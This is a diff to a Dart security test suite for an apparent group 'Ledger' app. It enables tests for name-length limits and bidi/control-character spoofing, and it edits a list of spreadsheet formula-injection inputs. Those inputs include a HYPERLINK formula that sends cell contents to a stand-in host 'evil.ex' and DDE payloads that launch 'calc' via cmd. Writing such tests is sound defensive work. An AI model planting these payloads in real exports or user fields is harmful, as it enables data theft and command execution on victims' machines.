@@ -123,9 +123,6 @@ void main() {
 
   group(
     'SPEC 5.16 limits enforced by the Ledger',
-    skip:
-        'QA SECURITY-R1-05: Ledger does not enforce the SPEC 5.16 length '
-        'and member-count limits',
     () {
       test('group name over 60 characters', () async {
         await expectLater(
@@ -194,9 +191,6 @@ void main() {
 
   group(
     'control and bidi override characters',
-    skip:
-        'QA SECURITY-R1-06: names and descriptions accept control, '
-        'zero-width and bidi override characters',
     () {
       // U+202E RIGHT-TO-LEFT OVERRIDE makes "Bob\u202Eevil" render as
       // "Bobvile" and flips the words after it in the same line, e.g.
@@ -318,7 +312,8 @@ void main() {
     }
 
     for (final payload in [
-      '=HYPERLINK("http://evil.example/?"&A1,"x")',
+      // At most 40 characters: member names are capped (SPEC 5.16).
+      '=HYPERLINK("http://evil.ex/?"&A1,"x")',
       '+1+cmd|\' /C calc\'!A0',
       '-2+3',
       '@SUM(1+1)*cmd|\' /C calc\'!A0',
